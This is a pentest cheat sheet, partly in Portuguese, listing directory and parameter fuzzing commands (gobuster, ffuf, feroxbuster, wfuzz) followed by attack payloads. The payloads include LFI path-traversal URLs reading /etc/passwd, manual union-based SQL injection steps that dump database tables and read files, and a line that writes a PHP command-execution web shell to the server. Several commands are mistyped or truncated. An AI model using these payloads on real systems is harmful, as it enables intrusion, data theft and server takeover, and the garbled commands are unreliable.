---
tags:
  - WEB
  - Pentest
---
# dirb
```shell
dirb http://<victim_ip>/ 
dirb http://<victim_ip>/ -r -o dirb.txt
```
# FEROXBUSTER
```shell
feroxbuster -u http://127.1 -x pdf -x js,html -x php txt json,docx
```

O comando acima adiciona .pdf, .js, .html, .php, .txt, .json e .docx a cada url Todos os métodos acima ( sinalizadores múltiplos, separação de espaço, separação de vírgulas, etc ... ) são válidos e intercambiáveis. O mesmo vale para URL, cabeçalhos, códigos de status, consultas e filtros de tamanho.

- T**ráfego de proxy através do Burp** 

```shell
feroxbuster -u http://127.1 --insecure --proxy http://127.0.0.1:8080
```
# gobuster
```shell
gobuster -u http://<victim_ip>/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -s '200,204,301,302,307,403,500' -e -o

gobuster.txt gobuster -u http://<victim_ip>/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -s '200,204,301,302,307,403,500' -e -x html,php,asp,aspx -o gobuster.txt

gobuster -u http://<victim_ip>/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -s '200,204,301,302,307,403,500' -e -k -x html,php,asp,aspx -o gobuster.txt

gobuster dir -u http://feeder.com.br -t 50 -w /media/morgan/Disk1/wordlists-369/admin1234.txt -v

hashcat -a 3 --stdout ?l | gobuster dir -u https://mysite.com -w - 

gobuster dir -u https://mysite.com/path/to/folder -c 'session=123456' -t 50 -w common-files.txt -x .php,.html 

gobuster dir -u https://buffered.io -w ~/wordlists/shortlist.txt -n 

gobuster dir -u https://buffered.io -w ~/wordlists/shortlist.txt -v 

gobuster dir -u https://buffered.io -w ~/wordlists/shortlist.txt -l 

gobuster dir -u https://buffered.io -w ~/wordlists/shortlist.txt -q -n -e 

#dns Mode 
gobuster dns -d mysite.com -t 50 -w common-names.txt 

gobuster dns -d google.com -w ~/wordlists/subdomains.txt 

gobuster dns -d google.com -w ~/wordlists/subdomains.txt -i 

gobuster dns -d yp.to -w ~/wordlists/subdomains.txt -i 

gobuster dns -d 0.0.1.xip.io -w ~/wordlists/subdomains.txt 

gobuster dns -d 0.0.1.xip.io -w ~/wordlists/subdomains.txt --wildcard 

#vhost Mode 
gobuster vhost -u https://mysite.com -w common-vhosts.txt 

#s3 Mode 
gobuster s3 -w bucket-names.txt fuzzing 
#Mode gobuster 

fuzz -u https://example.com?FUZZ=test -w parameter-names.txt 

#Use case in combination with patterns 

curl -s --output - https://raw.githubusercontent.com/eth0izzle/bucket-stream/master/permutations/extended.txt | sed -s 's/%s/{GOBUSTER}/' > patterns.txt 
gobuster s3 --wordlist my.custom.wordlist -p patterns.txt -v
```

# wfuzz 
```shell
wfuzz --hc 404,400 -c -z file,/usr/share/dirb/wordlists/big.txt http://<victim_ip>/FUZZ
```

# ffuf
```shell
ffuf -w wordlist.txt -u https://example.org/FUZZ -mc all -fs 42 -c -v 

ffuf -w /path/to/vhost/wordlist -u https://target/FUZZ
```

### depth 2 400 - Bad request
```shell
ffuf --input-cmd 'radamsa --seed $FFUF_NUM example1.txt example2.txt' -H "Content-Type: application/json" -X POST -u https://ffuf.io.fi/FUZZ -mc all -fc 400 

#Exemplo 1 : descoberta de diretório típica 
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u https://geeksforgeeks.org/FUZZ 

#Exemplo 2 : descoberta de host virtual (sem registros DNS) 
ffuf -w /usr/share/wordlists/vhost.txt -u https://geeksforgeeks.org -H “Host: FUZZ” -fs 4242 

#Exemplo 3 : Fuzzing de parâmetro GET 
ffuf -w /usr/share/wordlists/parameters.txt -u http://testphp.vulnweb.com/search.php?FUZZ=test_value -fs 4242 
ffuf -w /path/to/paramnames.txt -u https://target/script.php?FUZZ=test_value -fs 4242 

#Exemplo 4 : POST Data Fuzzing 
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -X POST -d “username = admin \ & password = FUZZ” -u https://testphp.vulnweb.com/login.php -fc 401 

ffuf -w /path/to/postdata.txt -X POST -d "username=admin\&password=FUZZ" -u https://target/login.php -fc 401 

#Exemplo 5 : usando um modificador externo para produzir casos de teste 
ffuf input-cmd 'radamsa –seed $FFUF_NUM example1.txt example2.txt' -H “Content-Type: application / json” -X POST -u https://testphp.vulnweb.com/ -mc all -fc 400 HTTP response code 401 

ffuf -w /path/to/values.txt -u https://target/script.php?valid_name=FUZZ -fc 401
```



```shell
#Cabeçalho do host do Fuzz, corresponda às respostas HTTP 200.
ffuf -w hosts.txt -u https://example.org/ -H "Host: FUZZ" -mc 200

#Dados do Fuzz POST JSON. Corresponder a todas as respostas que não contenham o texto erro
ffuf -w entries.txt -u https://example.org/ -X POST -H "Content-Type: application/json" \ -d '{"name": "FUZZ", "anotherkey": "anothervalue"}' -fr "error" 

#Fuzz vários locais. Corresponder apenas às respostas que refletem o valor da palavra-chave "VAL". Colori. 
ffuf -w params.txt:PARAM -w values.txt:VAL -u https://example.org/?PARAM=VAL -mr "VAL" -c 

ffuf -w common.txt -u http://testphp.vulnweb.com/FUZZ --recursion Maximum execution time

ffuf -w /path/to/wordlist -u https://target/FUZZ -maxtime 60 

ffuf -w /path/to/wordlist -u https://target/FUZZ -maxtime-job 60 -recursion -recursion-
```

O FFUF é um web fuzzer flexível que permite enviar vários tipos de solicitações para uma URL de destino e analisar as respostas. Aqui estão alguns comandos FFUF comumente usados e poderosos: 

```shell
#Comando Básico: 
ffuf -u <URL> -w <WORDLIST> 
#Este comando básico inicia o processo de fuzzing na URL especificada usando a lista de palavras fornecida. Especifique o método HTTP: php 

ffuf -u <URL> -X <HTTP_METHOD> 
#Use este comando para especificar o método HTTP a ser usado para solicitações (por exemplo, GET, POST, PUT, DELETE, etc.). 

#Cabeçalhos Fuzzing: matemática 
ffuf -u <URL> -H "Header1: Value1" -H "Header2: Value2" 
#Este comando permite que você difunda cabeçalhos específicos fornecendo valores de cabeçalho personalizados. 

#Cookies Fuzzing: matemática 
ffuf -u <URL> -b "Cookie1=Value1; Cookie2=Value2" 
#Use este comando para fazer fuzz em cookies específicos, fornecendo valores de cookies personalizados. 

#Fuzzing Recursivo: php 
ffuf -u <URL>/FUZZ -w <WORDLIST> 
Este comando executa fuzzing recursivo substituindo a palavra-chave "FUZZ" na URL por valores da lista de palavras. 
```

# VULNERABILITY SCAN
```shell
nikto --host=http://<victim_ip>
```

## LFI
```shell
#for Linux; 
http://<victim_ip>test.php?page=../../../../etc/passwd #basic
http://<victim_ip>test.php?page=../../../etc/passwd #null byte
http://<victim_ip>test.php?page=%252e%252e%252fetc%252fpasswd #double encoding 

#for Windows;
http://<victim_ip>/test.php?page=../../../../../WINDOWS/win.ini http://<victim_ip>/test.php?page=../../../../../xampp/apache/bin/php.in
```

## SQL Injection (Manual Steps) 
```shell
#Victim Address; 
http://<victim_ip>/test.php?id=3'  
```

```shell
#Find the number of columns;
http://<victim_ip>/test.php?id=3 order by 5 

#Find space to output db
http://<victim_ip>/test.php?id=3 union select 1,2,3,4,5 

#Get db-username and db-version information from the database;
http://<victim_ip>/test.php?id=3 union select 1,2,version(),4,5 http://<victim_ip>/test.php?id=3 union select 1,2,user(),4,5 

#Get all tables;
http://<victim_ip>/test.php?id=3 union select 1,2,table_name,4,5 from information_schema.tables
#Get all columns from a specific table;
http://<victim_ip>/test.php?id=3 union select 1,2, column_name 4,5 from information_schema.columns where table_name='wpusers'

#Viewing files;
http://<victim_ip>/test.php?id=3' union select 1,2, load_file('/var/www/mysqli_connect.php') ,4,5 -- -
http://<victim_ip>/test.php?id=3' union select 1,2, load_file('/etc/passwd') ,4,5 -- -

#Uploading files;
http://<victim_ip>/test.php?id=3' union select null,null, load_file('/var/www/brc_shell.php'),4,5 -- -
http://<victim_ip>/test.php?id=3' union select null,null, "<?php exec($_GET['cmd']) ?>" ,4,5 into outfile '/var/www/brc_shell.php' --
```